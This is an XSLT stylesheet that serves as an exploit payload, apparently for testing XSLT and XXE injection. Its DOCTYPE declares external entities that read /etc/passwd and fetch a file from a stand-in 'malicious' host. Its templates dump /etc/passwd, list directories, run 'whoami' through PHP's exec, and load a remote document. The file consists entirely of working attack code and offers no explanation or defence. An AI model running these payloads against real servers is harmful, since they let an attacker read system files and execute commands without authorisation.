<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY network SYSTEM "http://example.com/malicious">
]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl"
                version="1.0">

  <!-- XXE Exploits -->
  <xsl:template match="/">
    <html>
      <body>
        <h2>--- XXE Exploits ---</h2>
        <p>Reading /etc/passwd:</p>
        <pre><xsl:value-of select="document('/etc/passwd')"/></pre>

        <p>Reading via ENTITY:</p>
        <pre>&xxe;</pre>
      </body>
    </html>
  </xsl:template>

  <!-- PHP Function Exploits -->
  <xsl:template match="/php">
    <html>
      <body>
        <h2>--- PHP Exploits ---</h2>
        <p>File contents:</p>
        <pre><xsl:value-of select="php:function('file_get_contents', '/etc/passwd')"/></pre>

        <p>Scandir:</p>
        <pre><xsl:value-of select="php:function('scandir', '.')"/></pre>

        <p>Command Execution:</p>
        <pre><xsl:value-of select="php:function('exec', 'whoami')"/></pre>
      </body>
    </html>
  </xsl:template>

  <!-- Network Access -->
  <xsl:template match="/network">
    <html>
      <body>
        <h2>--- Network Access ---</h2>
        <p>Accessing a remote file:</p>
        <pre><xsl:value-of select="document('http://example.com/malicious')"/></pre>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
